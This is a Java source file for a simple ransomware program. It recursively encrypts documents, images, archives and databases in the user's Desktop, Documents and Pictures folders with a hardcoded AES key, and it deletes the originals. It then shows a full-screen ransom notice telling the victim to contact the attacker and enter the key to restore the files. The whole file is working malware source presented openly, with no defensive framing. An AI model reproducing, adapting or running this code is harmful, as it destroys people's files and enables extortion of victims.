package com.swagkarna;



import org.apache.commons.io.FileUtils;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;



public class Main {

    static JFrame f;
    static JLabel l;



    public enum OS {

        WINDOWS,LINUX,MAC,SOLARIS

    };

    private static OS os=null;

    public static String key="QfTjWmZq4t7w!z%C"; // 128 - bit key


    public static void main(String[] args) {

        FileFinder();
        WarningForm();

    }

    public static void FileFinder(){


        switch (getOS()){

            case WINDOWS:

            case LINUX:


            case  MAC:

        }

        ArrayList<String> CriticalPathList=new ArrayList<String>();
        // Add sensitive directories to the list

        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        CriticalPathList.add(System.getProperty("user.home") + "/Pictures");

        for(String TargetDirectory:CriticalPathList){

            File root=new File(TargetDirectory);

            try{

                String[] extensions={"pdf","doc","png","txt","zip","rar","jpg","sql","xls","bmp"};

                Collection files= FileUtils.listFiles(root, extensions,true);


                for( Object o: files){

                    File file= (File) o;


                    Encryptor(file.getAbsolutePath());


                }

            }catch (Exception e){
                e.printStackTrace();
            }
        }

    }



    public static void FileFinder(String ext){


        switch (getOS()){

            case WINDOWS:

            case LINUX:


            case  MAC:

        }

        ArrayList<String> CriticalPathList=new ArrayList<String>();


        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        CriticalPathList.add(System.getProperty("user.home") + "/Pictures");

        for(String TargetDirectory:CriticalPathList){

            File root=new File(TargetDirectory);

            try{

                String[] extensions={ext};
                Collection files= FileUtils.listFiles(root, extensions,true);


                for( Object o: files){

                    File file= (File) o;
                    Decryptor(file.getAbsolutePath());


                }

            }catch (Exception e){
                e.printStackTrace();
            }
        }

    }





    public static void Encryptor(String TargetFilePath){

        File targetFile=new File(TargetFilePath);
        File encryptedTargetFile=new File(TargetFilePath + ".graysuit");

        try {

            CryptoUtils.encrypt(key,targetFile,encryptedTargetFile);


        }catch (CryptoException ex){

            ex.printStackTrace();
        }


        targetFile.delete();


    }

    public static void WarningForm(){

        f=new JFrame("CodedBy:Swagkarna");
        l=new JLabel();

        l.setText(" Warning: All your important files are unfortunately encrypted, in order to decrypt these file contact the attacker and obtain the key " +
                " Then you can decrypt and restore your files!");

        JPanel p=new JPanel();

        p.add(l);
        f.add(p);


        //----input key for restoring files

        JPanel panel=new JPanel();
        JLabel label= new JLabel(" Enter the key : ");
        JTextField tf=new JTextField(10);

        JButton submit=new JButton("Restore my files");
        submit.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {


                String strVictimKey=tf.getText();

                if(strVictimKey.equalsIgnoreCase(key)){


                    JOptionPane.showMessageDialog(f,"Your entered key is true, your files are now under the decryption process, wait for a while!");
                    FileFinder("graysuit");


                }else{

                    JOptionPane.showMessageDialog(f,"Your entered key is false, be careful!");
                }

            }
        });



        JButton reset=new JButton("Reset");

        panel.add(label);
        panel.add(tf);
        panel.add(submit);
        panel.add(reset);


        f.getContentPane().add(BorderLayout.NORTH,label);
        f.getContentPane().add(BorderLayout.SOUTH, panel);

        f.setVisible(true);

        f.setExtendedState(JFrame.MAXIMIZED_BOTH);
        f.setUndecorated(true);
        f.setVisible(true);











    }

    public static void Decryptor(String EncryptedFilePath){


        File targetFile=new File(EncryptedFilePath);
        File decryptedTargetFile=new File(EncryptedFilePath +".decrypted");

        try {

            CryptoUtils.decrypt(key,targetFile,decryptedTargetFile);


        }catch (CryptoException ex){

            ex.printStackTrace();
        }


        targetFile.delete();

    }


    public static OS getOS(){

        if(os == null){

            String operSys= System.getProperty("os.name"). toLowerCase();

            if(operSys.contains("win")){

                os=OS.WINDOWS;
            }else if (operSys.contains("nix") || operSys.contains("nux") || operSys.contains("aix")) {
                os=OS.LINUX;
            }else if(operSys.contains("mac")){

                os=OS.MAC;
            }else if (operSys.contains("sunos")) { // solaris

                os = OS.SOLARIS;
            }
        }

        return os;

    }



}
